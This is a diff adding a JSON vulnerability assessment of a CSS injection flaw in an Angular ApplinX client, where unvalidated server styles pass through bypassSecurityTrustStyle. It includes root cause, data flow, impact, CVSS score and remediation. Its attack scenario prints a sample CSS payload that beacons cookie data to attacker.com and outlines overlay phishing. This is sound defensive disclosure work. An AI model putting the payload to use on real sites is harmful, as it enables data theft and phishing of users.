@@ -1,0 +1,79 @@
+{
+  "schema_version": "1.0",
+  "phase": "inquisitor",
+  "vulnerability_id": "VULN-001",
+  "descriptor": "css-injection-bypass-security-trust-style",
+  "assessment_id": "2026-07-31-10-57",
+  "metadata": {
+    "investigated": "2026-07-31T12:00:00Z",
+    "analyst": "D4rthB0b-Inquisitor",
+    "status": "confirmed"
+  },
+  "investigation": {
+    "confirmed_at": "2026-07-31T12:00:00Z",
+    "exploitability": "medium",
+    "root_cause": "InputFieldComponent.getCss() (input-field.component.ts:196-198) and FieldComponent.getCss() (field.component.ts:82-84) both pass field.style directly from the ApplinX REST API GetScreenResponse to DomSanitizer.bypassSecurityTrustStyle() without any validation, allowlist, or length check. The SafeStyle return value is bound to [style] in Angular templates, bypassing Angular's built-in style sanitization entirely. A compromised or malicious ApplinX server can inject arbitrary CSS declarations.",
+    "attack_scenario": "A compromised ApplinX REST API server returns GetScreenResponse with field.style set to malicious CSS (e.g., 'position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://attacker.com/?c=cookie)'). Because bypassSecurityTrustStyle() marks the value as trusted, Angular renders it as raw inline CSS. Without a Content Security Policy, this enables: (1) CSS-based UI redressing via position:fixed overlays that mimic login pages; (2) CSS attribute selector exfiltration targeting visible DOM content; (3) background-image URL loading to a remote server enabling beacon-based data leakage. Modern browsers block CSS expression() and javascript: URLs in CSS, so direct JS execution is not achievable via this vector alone.",
+    "prerequisites": [
+      "Attacker must control or compromise the ApplinX REST API backend server",
+      "User must be authenticated and receive a screen rendering input fields with attacker-controlled style",
+      "No CSP (Content-Security-Policy) header deployed — no CSP evidence found anywhere in codebase"
+    ],
+    "privilege_boundary": {
+      "start_privilege": "Compromised ApplinX server (network-adjacent trust boundary violation)",
+      "achieved_privilege": "CSS injection into authenticated browser DOM — UI redressing and CSS-based exfiltration",
+      "boundary_crossed": true
+    },
+    "impact": {
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none",
+      "description": "CSS injection via server-controlled style enables UI redressing (phishing overlays), CSS-based attribute value exfiltration, and visual deception. Modern browsers block direct JS execution via CSS. Without CSP, external resource loading is unrestricted. Impact is bounded by CSS capabilities — no arbitrary code execution without a secondary XSS vector. The same bypassSecurityTrustStyle pattern exists in both InputFieldComponent and FieldComponent."
+    },
+    "data_flow": {
+      "sources": [
+        "ApplinX REST API GET /screen → GetScreenResponse.fields[].style (server-controlled string)"
+      ],
+      "transformations": [
+        "field.style passed to DomSanitizer.bypassSecurityTrustStyle(field.style ?? '') — no validation, no allowlist, no sanitization",
+        "Return value is SafeStyle object, trusted by Angular template engine"
+      ],
+      "sinks": [
+        "[style]=\"getCss()\" on <input> element (input-field.component.html:14) — rendered as raw inline style",
+        "[style]=\"getCss()\" on protected field <div> elements (field.component.html) — same pattern"
+      ]
+    }
+  },
+  "affected_components": {
+    "direct": [
+      {"component": "InputFieldComponent.getCss() — src/app/mini-components/input-field/input-field.component.ts:196-198", "impact": "Primary CSS injection sink for editable input fields"},
+      {"component": "FieldComponent.getCss() — src/app/mini-components/field/field.component.ts:82-84", "impact": "Secondary CSS injection sink for protected (read-only) fields"},
+      {"component": "input-field.component.html:14 [style] binding", "impact": "Renders raw CSS into DOM without sanitization"}
+    ],
+    "indirect": [
+      {"component": "ApplinX REST API /screen endpoint", "impact": "Source of server-controlled field.style values; full trust placed in server"},
+      {"component": "StorageService (sessionStorage gx_token)", "impact": "If CSS injection were upgraded to JS (via browser bug), token accessible"}
+    ]
+  },
+  "remediation_guidance": {
+    "recommended_fix": "Remove bypassSecurityTrustStyle() entirely. Most ApplinX terminal styling can be achieved via predefined CSS classes mapped to server-supplied color/attribute codes (foreground, background, isIntensified are already handled this way). If field.style must be supported, implement a strict allowlist of permitted CSS properties and values using a whitelist parser before passing to any DOM binding.",
+    "priority": "high",
+    "defense_in_depth": [
+      "Deploy Content-Security-Policy header: style-src 'self' to block external CSS resource loading",
+      "Audit all remaining bypassSecurityTrust* calls in the codebase",
+      "Implement Angular pipe that validates CSS against a property+value allowlist",
+      "Consider server-side input validation on ApplinX REST API to reject injected style values"
+    ]
+  },
+  "references": {
+    "scan_finding": "vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-S-scan-finding.md",
+    "threat_model": ["TM-001", "TM-004"],
+    "attack_surface": ["AS-001", "AS-002"],
+    "external": [
+      "https://angular.dev/best-practices/security#bypass-security-apis",
+      "https://owasp.org/www-community/attacks/CSS_Injection",
+      "CWE-83: Improper Neutralization of Script in Attributes in a Web Page",
+      "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N — Score: 5.9 MEDIUM"
+    ]
+  }
+}
